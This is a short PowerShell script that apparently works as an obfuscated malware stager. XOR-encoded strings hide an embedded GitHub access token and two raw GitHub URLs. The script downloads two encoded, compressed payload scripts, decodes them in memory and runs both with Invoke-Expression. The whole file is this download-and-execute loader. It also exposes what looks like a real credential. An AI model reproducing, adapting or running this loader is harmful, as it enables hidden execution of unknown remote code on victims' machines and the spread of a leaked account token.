$k=66
Add-Type -AssemblyName System.IO.Compression
$t=-join(@(37,43,54,42,55,32,29,50,35,54,29,115,115,1,3,12,9,9,5,11,114,117,40,6,116,47,11,35,113,4,117,41,56,29,44,3,36,3,51,53,58,46,7,113,39,9,21,117,20,122,20,41,116,3,33,1,15,55,36,118,10,44,0,20,48,5,19,41,4,38,33,16,19,52,3,115,42,15,5,119,117,8,20,113,117,35,37,18,50,37,36,42,44)|%{[char]($_ -bxor $k)})
$h=@{Authorization="token $t";Accept="application/vnd.github.raw+json"}
$u1=-join(@(42,54,54,50,49,120,109,109,48,35,53,108,37,43,54,42,55,32,55,49,39,48,33,45,44,54,39,44,54,108,33,45,47,109,48,45,54,35,46,32,43,46,46,59,119,111,49,41,39,54,33,42,109,6,48,39,35,47,109,47,35,43,44,109,36,43,48,49,54,115,108,50,49,115)|%{[char]($_ -bxor $k)})
$u2=-join(@(42,54,54,50,49,120,109,109,48,35,53,108,37,43,54,42,55,32,55,49,39,48,33,45,44,54,39,44,54,108,33,45,47,109,48,45,54,35,46,32,43,46,46,59,119,111,49,41,39,54,33,42,109,6,48,39,35,47,109,47,35,43,44,109,26,26,108,50,49,115)|%{[char]($_ -bxor $k)})
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
function dec($u){
  $b=[Convert]::FromBase64String((Invoke-WebRequest -UseBasicParsing -Headers $h -Uri $u).Content)
  for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i] -bxor $k}
  $g=New-Object System.IO.Compression.GZipStream((New-Object System.IO.MemoryStream(,$b)),[System.IO.Compression.CompressionMode]::Decompress)
  $r=New-Object System.IO.StreamReader($g);$s=$r.ReadToEnd();$r.Close();$g.Close();return $s
}
$s1=dec $u1
$xp=dec $u2
IEX $s1
IEX $xp
